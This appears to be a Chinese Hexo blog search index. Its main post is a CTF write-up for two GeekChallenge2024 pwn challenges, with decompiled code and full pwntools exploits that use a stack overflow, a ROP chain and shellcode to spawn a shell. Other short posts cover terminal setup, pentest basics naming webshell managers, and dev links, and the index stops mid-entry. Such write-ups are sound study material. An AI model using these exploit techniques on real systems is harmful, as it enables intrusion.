<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>GeekChallenge2024_wp（复现）</title>
    <link href="/2025/07/02/GeekChallenge2024-wp%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/"/>
    <url>/2025/07/02/GeekChallenge2024-wp%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<blockquote><p>GeekChallenge2024 write-up (复现)</p></blockquote><p>pwn部分</p><h1 id="ez-shellcode"><a href="#ez-shellcode" class="headerlink" title="ez_shellcode"></a>ez_shellcode</h1><p>查保护<br><img src="/2024/10/29/hello-world/e2024-wp%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/file-20250702001655102.png"><br>no pie, no canary</p><p><img src="/2024/10/29/hello-world/e2024-wp%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/file-20250702001803623.png"><br>64位小端 动态链接</p><p>逆向主函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> name[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+8h] [rbp-18h] BYREF</span><br>  <span class="hljs-type">void</span> *p;      <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">size_t</span> len;   <span class="hljs-comment">// [rsp+18h] [rbp-8h] 申请的内存区域长度</span><br><br>  init(argc, argv, envp);                       <span class="hljs-comment">// 初始化缓冲区 3个都是 0 2 0 无缓冲模式</span><br>  len = sysconf(<span class="hljs-number">30</span>);                            <span class="hljs-comment">// 系统物理内存的页数</span><br>  p = mmap(<span class="hljs-number">0LL</span>, len, <span class="hljs-number">3</span>, <span class="hljs-number">34</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0LL</span>);           <span class="hljs-comment">// 申请内存</span><br>  <span class="hljs-keyword">if</span> ( p == (<span class="hljs-type">void</span> *)<span class="hljs-number">-1LL</span> )<br>  &#123;<br>    perror(<span class="hljs-string">&quot;mmap&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    shellcode = p;                              <span class="hljs-comment">// 指针 -&gt; 申请的内存</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Hello!!!&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;do you know shellcode?&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(shellcode, <span class="hljs-number">144</span>, <span class="hljs-number">0x1F4</span>uLL);           <span class="hljs-comment">// 申请内存区域赋值</span><br>    read(<span class="hljs-number">0</span>, shellcode, <span class="hljs-number">0x190</span>uLL);               <span class="hljs-comment">// 申请内存区域读入</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;please input your name:&quot;</span>);<br>    gets(name);                                 <span class="hljs-comment">// 向栈中读入数据 gets函数 可以栈溢出</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>该代码本质上就是顺序执行了2次读入</p><ol><li>程序在读入前先申请了一块内存，具有可读可写权限，在期间穿插puts输出提示信息</li><li>第一次读入申请的内存 可以写入shellcode</li><li>第二次读入栈         可以栈溢出</li></ol><p>在程序中发现了<code>gift()</code>函数：<br><img src="/2024/10/29/hello-world/e2024-wp%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/file-20250702012257850.png"><br>将申请内存的执行权限改为 <strong>仅可执行</strong><br>该函数没有被引用过</p><p>根据这些程序信息：</p><ul><li>可以在内存区域写入</li><li>可以将这个内存区域变为可执行</li><li>可以栈溢出控制rip</li></ul><p>那么现在pwn掉这个程序的思路：</p><ol><li>在程序逻辑的执行过程中 向申请内存写入待执行的shellcode</li><li>构造rop链，执行<code>gift()</code>函数，修改该申请内存权限为 仅可执行</li><li>执行这段shellcode, pwn掉这个程序。</li></ol><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br>exe = ELF(<span class="hljs-string">&quot;./shellcode&quot;</span>)<br>context.binary = exe<br><br><span class="hljs-keyword">if</span> os.environ.get(<span class="hljs-string">&quot;ZELLIJ&quot;</span>) == <span class="hljs-string">&quot;0&quot;</span>:<br>    context.terminal = [<br>        <span class="hljs-string">&quot;zellij&quot;</span>,<br>        <span class="hljs-string">&quot;action&quot;</span>,<br>        <span class="hljs-string">&quot;new-pane&quot;</span>,<br>        <span class="hljs-string">&quot;-d&quot;</span>,<br>        <span class="hljs-string">&quot;right&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>        <span class="hljs-string">&quot;--&quot;</span>,<br>        <span class="hljs-string">&quot;bash&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>    ]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">conn</span>():<br>    <span class="hljs-keyword">if</span> args.LOCAL:<br>        io = process([exe.path])<br>        <span class="hljs-keyword">if</span> args.GDB:<br>            gdb.attach(io)<br>    <span class="hljs-keyword">elif</span> args.GDB:<br>        io = gdb.debug([exe.path])<br>    <span class="hljs-keyword">else</span>:<br>        io = remote(<span class="hljs-string">&quot;nc1.ctfplus.cn&quot;</span>, <span class="hljs-number">21417</span>)<br>    <span class="hljs-comment"># nc nc1.ctfplus.cn 21417</span><br>        <br>    <span class="hljs-keyword">return</span> io<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">cmd=<span class="hljs-string">&quot;&quot;</span></span>):<br>    <span class="hljs-keyword">if</span> args.LOCAL:<br>        gdb.attach(io, cmd)<br>        pause()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">global</span> io<br>    io = conn()<br>    shellcode = asm(shellcraft.sh())<br>    io.sendlineafter(<span class="hljs-string">b&quot;do you know shellcode?\n&quot;</span>, shellcode)<br><br>    offset = <span class="hljs-number">0x18</span> + <span class="hljs-number">8</span><br>    gift = <span class="hljs-number">0x401256</span> <br>    sc_addr = <span class="hljs-number">0x7ffff7ffa000</span><br>    ret = <span class="hljs-number">0x401315</span> <br>    payload = <span class="hljs-string">b&quot;A&quot;</span> * offset + p64(ret) + p64(gift) + p64(ret) + p64(sc_addr)<br><br>    io.sendlineafter(<span class="hljs-string">b&quot;please input your name:\n&quot;</span>, payload)<br>    io.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><hr><h1 id="简单的签到题"><a href="#简单的签到题" class="headerlink" title="简单的签到题"></a>简单的签到题</h1><p><img src="/2024/10/29/hello-world/e2024-wp%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/file-20250702090617688.png"><br>64位小端 no pie no canary</p><p>逆向：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  init(argc, argv, envp);<br>  welcome();<br>  math1();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">welcome</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to the world of \&quot;pwn\&quot;!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<br>    <span class="hljs-string">&quot;Now you have to learn \&quot;nc\&quot; and \&quot;pwntools\&quot; to solve the following problems. If you are ready, press the Enter key&quot;</span><br>    <span class="hljs-string">&quot; to start our challenge.&quot;</span>);<br>  <span class="hljs-keyword">return</span> getchar();<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">math1</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> seed; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> num2; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> num1; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br><br>  seed = time(<span class="hljs-number">0LL</span>);<br>  srand(seed);<br>  num1 = rand() % <span class="hljs-number">10000</span> + <span class="hljs-number">1</span>;<br>  num2 = rand() % <span class="hljs-number">10000</span> + <span class="hljs-number">1</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d * %d = &quot;</span>, num1, num2);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)get_input_with_timeout() != num2 * num1 )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Incorrect. The correct answer was %d. Exiting...\n&quot;</span>, num2 * num1);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Correct! Opening shell...&quot;</span>);<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这个程序是先输入一些提示信息，然后让你快速算出两个随机数的和，算对即可给你shell<br>程序的核心是<code>math1()</code>函数和其中的<code>get_input_with_timeout()</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">get_input_with_timeout</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> num; <span class="hljs-comment">// [rsp+Ch] [rbp-84h] BYREF</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">128</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-80h] BYREF 栈上的内存</span><br><br>  signal(<span class="hljs-number">14</span>, (<span class="hljs-type">__sighandler_t</span>)handle_alarm);     <span class="hljs-comment">// 14(信号编号):alarm触发 handle_alarm:信号处理函数</span><br>  alarm(<span class="hljs-number">3u</span>);                                    <span class="hljs-comment">// 3秒定时器</span><br>  <span class="hljs-keyword">if</span> ( !fgets(s, <span class="hljs-number">128</span>, <span class="hljs-built_in">stdin</span>) )                  <span class="hljs-comment">// 向栈中读入数据</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No input received. Exiting...&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);                                    <span class="hljs-comment">// 如果为输入 exit退出</span><br>  &#125;<br>  <span class="hljs-keyword">if</span> ( timed_out )                              <span class="hljs-comment">// 全局变量</span><br>  &#123;                                             <span class="hljs-comment">// 一旦触发信号处理函数</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Time is up. Exiting...&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);                                    <span class="hljs-comment">// 如果超时，exit退出</span><br>  &#125;<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)__isoc99_sscanf(s, <span class="hljs-string">&quot;%d&quot;</span>, &amp;num) == <span class="hljs-number">1</span> )<span class="hljs-comment">// 从s向buf读取十进制数字（一定要在3秒内走到这一步）</span><br>  &#123;                                             <span class="hljs-comment">// 读取成功</span><br>    alarm(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> num;                                 <span class="hljs-comment">// 返回读取的十进制数字</span><br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid input. Please enter a number.&quot;</span>);<span class="hljs-comment">// 无效输入</span><br>    alarm(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0xFFFFFFFF</span>LL;                        <span class="hljs-comment">// 返回-1</span><br>  &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">handle_alarm</span><span class="hljs-params">()</span><br>&#123;<br>  timed_out = <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>程序用<code>get_input_with_timeout()</code>函数读取输入的乘法结果，<br>并用<code>signal()</code>和<code>alarm()</code>函数对输入时间进行了限制<br>3秒内完成输入等步骤才可以正常返回，否则会返回错误的值使对比失败</p><p>三秒内完成计算等步骤即可</p><p>在脚本中接受数据，进行计算后发送 即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br>exe = ELF(<span class="hljs-string">&quot;./main_patched&quot;</span>)<br><br>context.binary = exe<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-keyword">if</span> os.environ.get(<span class="hljs-string">&quot;ZELLIJ&quot;</span>) == <span class="hljs-string">&quot;0&quot;</span>:<br>    context.terminal = [<br>        <span class="hljs-string">&quot;zellij&quot;</span>,<br>        <span class="hljs-string">&quot;action&quot;</span>,<br>        <span class="hljs-string">&quot;new-pane&quot;</span>,<br>        <span class="hljs-string">&quot;-d&quot;</span>,<br>        <span class="hljs-string">&quot;right&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>        <span class="hljs-string">&quot;--&quot;</span>,<br>        <span class="hljs-string">&quot;bash&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>    ]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">conn</span>():<br>    <span class="hljs-keyword">if</span> args.LOCAL:<br>        io = process([exe.path])<br>        <span class="hljs-keyword">if</span> args.GDB:<br>            gdb.attach(io)<br>    <span class="hljs-keyword">elif</span> args.GDB:<br>        io = gdb.debug([exe.path])<br>    <span class="hljs-keyword">else</span>:<br>        io = remote(<span class="hljs-string">&quot;nc1.ctfplus.cn&quot;</span>, <span class="hljs-number">41294</span>)<br>        <span class="hljs-comment"># nc nc1.ctfplus.cn 41294</span><br>    <span class="hljs-keyword">return</span> io<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">cmd=<span class="hljs-string">&quot;&quot;</span></span>):<br>    <span class="hljs-keyword">if</span> args.LOCAL:<br>        gdb.attach(io, cmd)<br>        pause()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">global</span> io<br>    io = conn()<br>    io.recvuntil(<span class="hljs-string">b&quot;start our challenge.\n&quot;</span>)<br>    io.send(<span class="hljs-string">b&quot;\n&quot;</span>)<br>    num1 = io.recvuntil(<span class="hljs-string">b&quot; * &quot;</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]<br>    num2 = io.recvuntil(<span class="hljs-string">b&quot; =&quot;</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]<br>    num1 = <span class="hljs-built_in">int</span>(num1)<br>    num2 = <span class="hljs-built_in">int</span>(num2)<br>    res = num1 * num2<br>    io.sendline(<span class="hljs-built_in">str</span>(res))<br>    io.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><hr><h1 id="000000"><a href="#000000" class="headerlink" title="000000"></a>000000</h1><p><img src="/2024/10/29/hello-world/e2024-wp%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/file-20250702120152264.png"><br>64位小端  pie canary</p>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>我的wsl</title>
    <link href="/2025/07/02/%E6%88%91%E7%9A%84wsl/"/>
    <url>/2025/07/02/%E6%88%91%E7%9A%84wsl/</url>
    
    <content type="html"><![CDATA[<h1 id="终端复用-zellij"><a href="#终端复用-zellij" class="headerlink" title="终端复用 - zellij"></a>终端复用 - zellij</h1><p>我使用zellij作为终端复用工具，我十分喜欢它简洁美观、操作简便的特点</p>]]></content>
    
    
    <categories>
      
      <category>Environment</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>oh-my-posh</title>
    <link href="/2025/06/30/oh-my-posh/"/>
    <url>/2025/06/30/oh-my-posh/</url>
    
    <content type="html"><![CDATA[<p>一个主题记录</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">oh</span><span class="hljs-literal">-my-posh</span> init pwsh <span class="hljs-literal">--config</span> <span class="hljs-variable">$env:POSH_THEMES_PATH</span>\montys.omp.json | <span class="hljs-built_in">Invoke-Expression</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Environment</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>渗透入门</title>
    <link href="/2025/06/30/%E6%B8%97%E9%80%8F%E5%85%A5%E9%97%A8/"/>
    <url>/2025/06/30/%E6%B8%97%E9%80%8F%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<p>渗透测试环境部署<br>目录扫描和端口扫描<br>burpsuite安装</p><p>php study集成了：</p><ul><li>网站服务器： apache</li><li>数据库服务器： 使用MySQL</li><li>网站脚本语言解析环境：php</li></ul><p>攻击者</p><p>工具：burp等</p><h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><p>作为网站管理员，可以清楚地知道网站本身的目录结构；但是攻击者不知道。<br>所以攻击者需要做<strong>目录扫描</strong></p><p>工具：<br>windows: 御剑<br>linux: dirb、 dirsearch</p><p>御剑：<br><img src="/2024/10/29/hello-world/250630144958617.png"></p><p><img src="/2024/10/29/hello-world/250630145316278.png"></p><p><img src="/2024/10/29/hello-world/250630145607223.png"><br>比在网站中找和点要来的快</p><p><img src="/2024/10/29/hello-world/250630150036751.png"></p><p>attacker扫描网站时，如果网站打不进去怎么办？</p><p>端口扫描 —— 确认可以访问的网络环境中 还有无机器目标， 这些目标是否还有可以利用的服务</p><p>端口扫描工具： nmap</p><p>nmap基本使用</p><p>扫一下主机<br><img src="/2024/10/29/hello-world/250630160219989.png"></p><p>渗透测试流程<br>模拟黑客，对网站发起攻击，发现漏洞</p><p>网站的组成<br>服务器系统(windows&#x2F;linux) + 中间件（Nginx&#x2F;aphache iis）+ 网站源代码（php java go)</p><ol><li>信息收集（了解这个网站 使用了哪些中间件 是什么系统底层 什么语言 使用了哪些组件（第三方组件、框架））</li></ol><p>识别过程称为指纹识别</p><p>公网靶场<br><img src="/2024/10/29/hello-world/250702092328547.png"></p><p>burp的最大作用<br>代理拦截</p><p>网站服务器   流量请求（发送数据包） 浏览器PC</p><p>webshell管理器</p><ul><li>冰蝎    （不容易被识别 aes+base64加密流量）</li><li>哥斯拉    （不易被识别 木马内容加密）</li><li>中国蚁剑 （初学者 最简单方便 跨平台 用java编写）（缺点：流量容易被识别） yuque</li></ul>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>uniapp打自定义基座</title>
    <link href="/2025/05/19/uniapp%E6%89%93%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%BA%E5%BA%A7/"/>
    <url>/2025/05/19/uniapp%E6%89%93%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%BA%E5%BA%A7/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/weixin_40597676/article/details/112173216">uniapp—配置自定义基座_uniapp 自定义基座-CSDN博客</a></p>]]></content>
    
    
    <categories>
      
      <category>前后端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>css实现渐变色边框</title>
    <link href="/2025/05/16/css%E5%AE%9E%E7%8E%B0%E6%B8%90%E5%8F%98%E8%89%B2%E8%BE%B9%E6%A1%86/"/>
    <url>/2025/05/16/css%E5%AE%9E%E7%8E%B0%E6%B8%90%E5%8F%98%E8%89%B2%E8%BE%B9%E6%A1%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://juejin.cn/post/7190271291968979005">完美解决渐变色边框（Gradient borders）问题边框渐变目前没有一个完美的解决方案，多少会存在一点瑕疵，使用h - 掘金</a><br>哥们有操作的</p>]]></content>
    
    
    <categories>
      
      <category>前后端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>iPad+UTM+Arch</title>
    <link href="/2025/04/27/iPad-UTM-Arch/"/>
    <url>/2025/04/27/iPad-UTM-Arch/</url>
    
    <content type="html"><![CDATA[<p>之前在iPad上装了iSH + alpine linux, 但是iSH仅支持32位系统，且未找到支持Alpine linux的pwndbg，导致体验一般，这回在iPad上装个UTM SE，再装个Arch试试</p><hr><h1 id="Arch"><a href="#Arch" class="headerlink" title="Arch"></a>Arch</h1><h2 id="pacman基本使用"><a href="#pacman基本使用" class="headerlink" title="pacman基本使用"></a>pacman基本使用</h2><blockquote><p>Arch的包管理器</p></blockquote><p>更新&#x2F;升级软件包</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> pacman -Syu<br><span class="hljs-comment"># -S 同步软件包</span><br><span class="hljs-comment"># -y 更新软件包数据库</span><br><span class="hljs-comment"># -u 升级已安装的软件包</span><br></code></pre></td></tr></table></figure><p>安装一个&#x2F;多个软件包</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> pacman -S package1 package2 package3<br></code></pre></td></tr></table></figure><hr><p>补：<br>虽然安装了，但是性能过于拉跨，基本没什么体验，最终放弃了。</p>]]></content>
    
    
    <categories>
      
      <category>chore</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>VSCode Server</title>
    <link href="/2025/04/26/VSCode-Server/"/>
    <url>/2025/04/26/VSCode-Server/</url>
    
    <content type="html"><![CDATA[<p>参考：<br><a href="https://blog.csdn.net/mighty13/article/details/114419378">VScode：禁止VScode自动升级_vscode 禁用更新-CSDN博客</a><br><a href="https://blog.csdn.net/alodonoa/article/details/134217813">下载安装各种版本的Vscode以及解决VScode官网下载慢的问题-CSDN博客</a></p><p><a href="https://blog.csdn.net/aa820t/article/details/136139985">vscode1.85.2便携版下载地址_vscode 1.85.2-CSDN博客</a></p><p><a href="https://github.com/Microsoft/vscode/releases">Releases · microsoft&#x2F;vscode</a></p><p><a href="https://zhuanlan.zhihu.com/p/671718415">我只教一次！vscode remote-ssh 连接失败的基本原理和优雅的解决方案 - 知乎</a></p><p><a href="https://blog.csdn.net/qq_43948052/article/details/146123406">【已解决】VS Code中Github Copilot在SSH远程环境中无法登录问题_在最近一次远程 - ssh 会话中检测到以下问题 ctrl+单击某个问题以在 copilot 聊天-CSDN博客</a></p><p>SLR1分析方法 》 LR1</p>]]></content>
    
    
    <categories>
      
      <category>Environment</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>入坑neovim</title>
    <link href="/2025/04/25/%E5%85%A5%E5%9D%91neovim/"/>
    <url>/2025/04/25/%E5%85%A5%E5%9D%91neovim/</url>
    
